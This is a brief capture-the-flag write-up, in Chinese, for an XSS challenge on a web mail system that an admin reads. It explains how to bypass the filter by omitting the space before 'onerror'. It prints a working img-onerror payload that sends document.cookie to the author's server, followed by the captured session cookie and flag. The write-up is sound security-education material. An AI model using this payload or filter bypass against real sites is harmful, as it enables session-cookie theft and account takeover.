## xssme (100)
### solution
稍微試了一下可以發現是一個簡單的郵件系統，admin會閱讀所有郵件，因此試著在郵件中進行XSS。
而標題欄位會進行escape，無法有效攻擊，但內文是使用過濾方式，無法使用`<script>`、`<iframe>`，但可以用`<img>`
因此試著用`<img src="#" onerror=>`進行攻擊發現` onerror`也會過濾，但拿掉前面的空白即可，因此使用XSS發送admin的cookie到自己的server上。
```js
<img src="#"onerror=javascript:document.location="http://MY_IP/log.php?c="+document.cookie>
```
得到以下回應：
```
Array
(
    [c] => PHPSESSID=1oiprdg6u65httgspivmnpjfe6; FLAG_XSSME=FLAG{Sometimes, XSS can be critical vulnerability <script>alert(1)</script>}; FLAG_2=IN_THE_REDIS
)
```
